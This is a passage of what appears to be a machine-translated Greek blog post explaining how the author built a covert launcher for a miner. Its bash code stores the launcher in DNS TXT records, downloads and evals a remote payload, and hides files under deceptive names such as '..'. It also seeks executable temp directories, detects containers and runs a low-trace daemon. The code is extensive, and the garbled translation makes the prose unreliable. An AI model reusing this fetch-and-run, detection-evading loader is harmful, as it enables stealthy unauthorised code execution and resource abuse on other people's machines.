φαίνεται επίσης να έχει<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> χαμένα στοιχήματα</a> Αυτό δεν θα συμβεί ξανά ... έτσι κι αλλιώς δεν είμαστε τόσο εξελιγμένοι, θα τα βγάλουμε πέρα ​​με κάποιες εγγραφές DNS που αποθηκεύουν ένα σενάριο που τραβά το ωφέλιμο φορτίο που εκτελείται και φεύγει<em> σχεδόν</em> κανένα ίχνος της εγκατάστασής του. Εδώ είναι ένα μικρό διάγραμμα ροής που απεικονίζει τη δομή</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> Προωθητής</a></h2><p>Το νόημα ενός σεναρίου εκκίνησης είναι να είναι προσβάσιμο και εύκολα ενημερωμένο έτσι ώστε να αντέχει στο χρόνο. Ενημέρωση<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> οι εγγραφές είναι εύκολες και το DNS είναι το τελευταίο πράγμα που τερματίζεται μέσα σε ένα δίκτυο..επειδή οι διευθύνσεις IP είναι δύσκολο να θυμηθούν ... έτσι οι πιθανότητες είναι ότι θα είναι διαθέσιμες τις περισσότερες φορές. Βλέπετε πότε είμαστε<em> λήψη του σεναρίου ανάπτυξης</em>Στην πραγματικότητα τρέχουμε ήδη κάποια λογική, αυτό είναι το σενάριο εκκίνησης, χρειάζεται τη δυνατότητα να εκτελεί ερωτήματα DNS για την αναζήτηση των αρχείων μας, το DNS μπορεί να είναι πανταχού παρόν, αλλά<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> σκάβω</a> δεν είναι.<p>Υπάρχει ένα μικρό αίνιγμα εδώ, αν πρέπει να κατεβάσουμε ένα άλλο εργαλείο<em> για λήψη άλλου σεναρίου για λήψη του ωφέλιμου φορτίου</em> πρέπει απλά να κατεβάσουμε το ωφέλιμο φορτίο! Σε άμυνα ... το να κάνεις αυτόν τον σεναριακό χορό προσθέτει στο θάμπωμα, επιτρέπει να διατηρήσεις μόνο μία εφαρμογή του εκτοξευτή (διατηρησιμότητα, ναι), δεν απαιτείται τις περισσότερες φορές .. έτσι εξυπηρετούμε επίσης<a href=https://en.wikipedia.org/wiki/Standalone_program> στατικά συνδεδεμένο</a> σκάψιμο εκτελέσιμο για την εκτέλεση ερωτημάτων dns, που λαμβάνονται είτε από αυτόματη φιλοξενία, είτε από φιλοξενία cloud (ναι, υπάρχουν εφεδρικές λύσεις, όπως 3 ή 4, επειδή οι υπηρεσίες cloud έχουν πολύ ελάχιστο δωρεάν εύρος ζώνης και απαιτούν επίσης cookie ή μάρκες πρόσβασης ... είναι πολύ script εχθρικά, σκόπιμα, φυσικά)<p>Τι υπάρχει στα αρχεία dns; Χρησιμοποιούμε<a href=https://en.wikipedia.org/wiki/TXT_record> κείμενο</a> εγγραφές, σε έναν προσαρμοσμένο τομέα (ανταλλακτικά και εδώ). Γιατί TXT; τυχαίνει να είναι αυτά που μπορούν να αποθηκεύσουν τον μεγαλύτερο όγκο δεδομένων..συνήθως αφού είναι κάπως<a href=https://www.ietf.org/rfc/rfc6763.txt> συνιστάται</a> εξαρτάται από<em> πράγματα</em> Το Χρησιμοποιούμε συγκεκριμένα<a href=https://www.cloudflare.com/> cloudflare</a> για το DNS fiddling μας επειδή είναι δωρεάν και σχεδόν ο μόνος παίκτης στην πόλη (<em> δεν είναι πραγματικά, αλλά οποιαδήποτε άλλη εναλλακτική χλωμή χαρακτηριστικά σοφή</em> ). Συμβαίνει ότι μπορείτε να αποθηκεύσετε πολλά κομμάτια δεδομένων στο<em> ίδιο</em> εγγραφή ... αυτό αρχίζει να μπερδεύεται και να προσπαθεί για ορισμένες προδιαγραφές ... (εφαπτομένη) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> συνηθισμένος</a> επιτρέπω<em> αλυσοδεμένος</em>Το TXT καταγράφει συνολικά k 9k bytes, τα έγγραφα δηλώνουν τώρα k 2k bytes, πριν από την αλλαγή που χρησιμοποιούσα k 6k νομίζω, και εξυπηρετούσα το σενάριο ασυμπίεστα, μετά από αυτό έπρεπε να αραιώσω το σενάριο και να το συμπιέσω πριν από το χέρι (στην πραγματικότητα προσπάθησε να χρησιμοποιήσει ένα<a href=https://freedns.afraid.org/> ελεύθεροι</a> πάροχο, μου απαγορεύτηκε μέσα σε μία ημέρα, μαντεύοντας ότι έχουν μια αυστηρή πολιτική εγγραφών χωρίς λιπαρά TXT), ωστόσο η συμπίεση gzip ΔΕΝ είναι φιλική προς το σωλήνα και εξακολουθούσε να προκαλεί προβλήματα, οπότε έπρεπε να καταφέρω να στριμώξω το σενάριο χωρίς συμπίεση ( τέλος εφαπτομένη).<p>Πώς το αποθηκεύουμε; Οι εγγραφές TXT υποστηρίζουν μόνο αλφαριθμητικές συμβολοσειρές, αρ<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , οπότε πρέπει να το τυλίξουμε σε μια μη μηδενική κωδικοποίηση,<a href=https://en.wikipedia.org/wiki/Base64> βάση 64</a> ικανοποιεί αυτόν τον περιορισμό, και επειδή αποθηκεύουμε<em> αλυσοδεμένος</em> Καταγράφει TXT, πρέπει να κόψουμε την έξοδο, καθώς χρησιμοποιούμε κελύφη, αυτό γίνεται μέσω του<code>-w</code> σημαία, στο busybox, αυτή η σημαία απουσίαζε (ή επέλεγε) σε παλαιότερες εκδόσεις που ήταν ενοχλητική, μια εναλλακτική λύση είναι η χρήση του κωδικοποιητή που συνοδεύει το openssl,<code>openssl enc -base64</code>.<p>Τώρα που γνωρίζουμε πώς να αποθηκεύσουμε το σενάριο ανάπτυξης, το αποθηκεύουμε με οποιοδήποτε<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> ή χειροκίνητα. Πώς το τραβάμε; Αναφέραμε ότι χρειαζόμαστε bindutils ή τη δική μας<code>dig</code> ... αφού έχουμε επιλέξει το τελικό σημείο εξυπηρέτησης, θέλουμε να το κατεβάσουμε, συνήθως αυτό που είναι διαθέσιμο<a href=https://www.gnu.org/software/wget/> wget</a> ή<a href=https://curl.se/> μπούκλα</a> , το wget βρίσκεται προεγκατεστημένο πολύ πιο συχνά, ωστόσο το busybox παρέχει υποστήριξη tls μόνο με δυναμικές βιβλιοθήκες, οπότε πρέπει να βεβαιωθείτε ότι το τελικό σημείο εξυπηρετεί το http ή το βοηθητικό σας πρόγραμμα<code>wget</code> από gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Σημαίνει προσπάθεια<code>-t2</code> χρόνοι αναμονής<code>-T10</code> δευτερόλεπτα είναι<code>-q</code> ήσυχο διάβασμα από<code>-i-</code> stdin (<code>$digurl</code> ) και γράφοντας σε<code>-O-</code> stdout (<code>$filename</code>). Αυτή η εντολή δεν αποκαλύπτει τι κατεβάζουμε με μια πρώτη ματιά. Θα είμαστε πολύ προσεκτικοί με άλλες εντολές κελύφους για τον ίδιο λόγο ή θα κολλήσουμε με το κέλυφος (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> κτυπώ δυνατά</a> ) ενσωματωμένα όπου είναι δυνατόν. Φροντίστε επίσης για το πού κατεβάζετε τα εκτελέσιμα αρχεία σας, θέλετε να διασφαλίσετε ότι μπορείτε να τα εκτελέσετε, καθώς ορισμένα σημεία στήριξης, ειδικά σε κοντέινερ και<code>tmp</code> μονοπάτια είναι<code>noexec</code> Το Τώρα που έχουμε το εργαλείο αναζήτησης του dns, φέρνουμε τις εγγραφές μας<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +<span class=hljs-built_in>timeout</span>=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Οι σημαίες είναι αυτονόητες εδώ,<code>+short</code> σημαίνει απλώς ότι μας ενδιαφέρουν μόνο τα ίδια τα δεδομένα, έτσι ώστε να μην χρειάζεται να αναλύσουμε την έξοδο. Είναι σημαντικό να καθορίσετε τον διακομιστή DNS, όπως το google (<code>8.8.8.8</code> ) ή cloudflare (<code>1.1.1.1</code> ) επειδή πολλά περιβάλλοντα ανακατευθύνουν ή μεσολάβησης dns ερωτήματα στους δικούς τους διακομιστές dns από προεπιλογή. Αφού λάβουμε το κομμένο σενάριο, ασχολούμαστε με εισαγωγικά και κενά διαστήματα για να το κάνουμε έτοιμο για αποκωδικοποίηση<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Κι αν τώρα εμείς<em> ακόμη</em> δεν έχετε τον εκτοξευτή μας; Το DNS είναι ακατάστατο, θέλουμε ένα εφεδρικό, σας επιτρέπει να ρυθμίσετε έναν υποτομέα για να λάβετε απευθείας το σενάριο εκκίνησης. Πριν από την αξιολόγηση του σεναρίου μας, θέλουμε να το προσαρμόσουμε, με ορισμένες μεταβλητές, και πάλι να χρησιμοποιήσουμε μια εγγραφή TXT για να αποθηκεύσουμε μια λίστα NAME = VALUE μεταβλητών και να την αναλύσουμε. Υπάρχει επίσης ένα εφεδρικό για μεταβλητές, το cloudflare προσφέρει ανακατευθύνσεις βάσει URL, αυτές οι ανακατευθύνσεις εξυπηρετούνται<em> πριν</em> τον προορισμό, οπότε δεν χρειαζόμαστε ένα τελικό σημείο, απλώς θέλουμε να διαμορφώσουμε τους κανόνες ανακατεύθυνσης που βασίζονται σε regex σε ένα εικονικό τελικό σημείο, αυτό που μας ενδιαφέρει είναι οι παράμετροι του url<code>?NAME=VALUE&NAME2=VALUE2...</code>, ώστε να μπορούμε να παραμετροποιήσουμε τον εκκινητή μας απλά αλλάζοντας το url ανακατεύθυνσης, πάντα με προσοχή στην παράθεση και διαφυγή κωδικών<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Το wget<code>-S</code> εκτυπώνει το url ανακατεύθυνσης που μας ενδιαφέρει για ανάλυση. Έχοντας τις παραμέτρους και το σενάριο, αξιολογούμε τις μεταβλητές που τις γράφουν σε ένα αρχείο<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Αυτό το αρχείο θα προέρχεται από το σενάριο ανάπτυξης. Το τελευταίο μέρος του σεναρίου εκκίνησης είναι πραγματικό<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> σουμιές</a> , αξιολογήστε το σενάριο εντός της τρέχουσας διαδικασίας κελύφους ή ίσως αφήστε το να διαχειριστεί από το tmux αν είναι δυνατόν.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Το σενάριο εκκίνησης μεταφέρεται σε ένα αρχείο με όνομα ".." αυτό φαίνεται μπερδεμένο επειδή μπορεί να εκληφθεί ως α<em> μητρική εταιρεία</em> Ευρετήριο. Και δεν συμπεριλαμβάνουμε την εντολή συνεδρίας, καθώς αυτό θα καθυστερούσε στην εντολή διεργασίας, αντίθετα ξεκινάμε την περίοδο σύνδεσης tmux εκ των προτέρων και στέλνουμε την εντολή προέλευσης μέσω της τερματικής διεπαφής tmux. Σχετικά με αυτό, μερικές φορές καλώντας ένα εκτελέσιμο με<code>./</code> διατηρεί αυτούς τους χαρακτήρες στην εντολή, οπότε είναι καλύτερο να προσθέσετε το<code>$PWD</code> στο μονοπατι ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Το ωφέλιμο φορτίο</a></h2><p>Το σενάριο ανάπτυξης μας ξεκινά με την προμήθεια του<code>env.sh</code> αρχείο, και τη διατήρηση ή τη διαμόρφωση των vars ως<code>STARTING_*</code> βάρες όπως<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Αυτό μας επιτρέπει να σκοτώσουμε και να επανεκκινήσουμε ένα στιγμιότυπο λειτουργίας ενώ επαναφέρουμε το περιβάλλον. Επιτρέπει τη μετάβαση σε έναν κατάλογο tmp με δυνατότητες exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; <span class=hljs-keyword>do</span><span class=hljs-built_in>rm</span> -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        <span class=hljs-built_in>mkdir</span> -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Έλεγχος εάν εντός α<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> δοχείο</a> είναι επίσης πρακτικό, μπορούμε να διερευνήσουμε το σύστημα αρχείων για υποδείξεις<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Τώρα ήρθε η ώρα να κατεβάσουμε το ωφέλιμο φορτίο μας, επιλέγουμε να υποστηρίζουμε και το wget και το curl, ξέρουμε ήδη πώς να χρησιμοποιούμε το wget με προσεκτικές σημαίες, για το curl είναι λίγο διαφορετικό. Πρέπει να δημιουργήσουμε ένα αρχείο διαμόρφωσης και να παρακάμψουμε<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Το τελευταίο βήμα είναι να εξαγάγετε το ωφέλιμο φορτίο<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Αξίζει να αναφερθεί η χρήση ενός [CDN] για την εξυπηρέτηση του ωφέλιμου φορτίου. Εδώ πάλι το cloudflare για τη διάσωση μας σώζει από δαπάνες εύρους ζώνης. Μετονομάζοντας απλά το συμπιεσμένο ωφέλιμο φορτίο μας με α<em> επέκταση αρχείου</em> υποστηρίζεται από cloudflare ... γίνεται προσωρινή αποθήκευση. Το Cloudflare δεν ελέγχει τις επικεφαλίδες του τι εξυπηρετεί, ίσως επειδή το κάνει σε αυτή την κλίμακα είναι απλώς ανέφικτο.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Περιπέτειες κάτω από το Bashland</a></h2><p>Το Bash επιλέχθηκε με την υπόθεση ότι είναι φορητό, δεν φαίνεται πολύ παράταιρο και είναι πιο πανταχού παρόν σε σύγκριση με άλλες γλώσσες δέσμης ενεργειών, όπως το perl, το ruby ​​ή το python. Η αλήθεια είναι ότι ένα αυτόνομο δυαδικό γράψιμο σε golang ή lua θα ήταν πολύ πιο εύκολο, με λιγότερα σφάλματα και ευκολότερο στη συντήρηση, βασικά το bash ήταν η χειρότερη δυνατή επιλογή, προς υπεράσπισή μου, από τη στιγμή που ξύσα τόσες πολλές φαγούρες με bash , ήταν πολύ αργά για επανεγγραφή, και ήταν επίσης κάπως βαρετό.<p>Υπήρχε επίσης η επιλογή να χρησιμοποιήσετε το busybox με τη σημαία χρόνου μεταγλώττισης για να χρησιμοποιήσετε όλα τα ενσωματωμένα (όπως grep και sed), ωστόσο η χρήση των ενσωματωμένων με αυτόν τον τρόπο δεν επιτρέπει την αναπαραγωγή εργασιών (πιρούνι) και εκθέτει τον δαίμονα σε πιθανά αδιέξοδα.<p>Θα περιγράψω μερικές λειτουργίες bash εδώ, με την πλήρη λίστα διαθέσιμη<a href=\assets/posts/bash_functions.txt> εδώ</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Χρησιμοποιήστε το<code>RANDOM</code> μεταβλητή για να λάβετε έναν αριθμό μεταξύ 97-122 που αντιστοιχεί σε έναν κωδικό χαρακτήρα, το printf πρέπει να είναι ενσωματωμένο, δεν θέλουμε να περνάμε μέσα σε έναν βρόχο.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span><span class=hljs-built_in>mkfifo</span><span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span><span class=hljs-built_in>rm</span> -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Αξιοποιήστε τους σωλήνες για να δημιουργήσετε ανώνυμους περιγραφείς αρχείων, αυτοί δεν συμπεριφέρονται ακριβώς όπως οι περιγραφείς αρχείων, αλλά είναι αρκετά καλοί για<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Όταν κοιμάστε χωρίς πιρούνια, καταχρώντας τη λειτουργικότητα λήξης της ενσωματωμένης ανάγνωσης, χρησιμοποιεί έναν ειδικό περιγραφέα αρχείων και πρέπει να διασφαλίσουμε ότι είναι διαθέσιμο για να αποφευχθεί ο τερματισμός.<p>Υπάρχουν λειτουργίες όπως<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> χρησιμοποιούνται για την παρακολούθηση της χρήσης του συστήματος, όλα αυτά κάνουν χρήση του linux<code>/proc</code> αρχεία χωρίς εργαλεία όπως<code>ps</code> , έτσι δεν υπάρχει διχάλα, όλα καθαρά bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Οι συνεπεξεργασίες είναι διαθέσιμες από το bash<code>v4</code> , είναι σαν δουλειές εκτός από το ότι έχουν όνομα και τους δικούς τους περιγραφείς αρχείων.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Γράφουμε έναν δαίμονα, που είναι μια μακρόχρονη διαδικασία και χρησιμοποιούμε πολλούς περιγραφείς αρχείων, θέλουμε πραγματικά να κάνουμε κάποιους καθαρισμούς για να αποφύγουμε<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ουλιμ</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
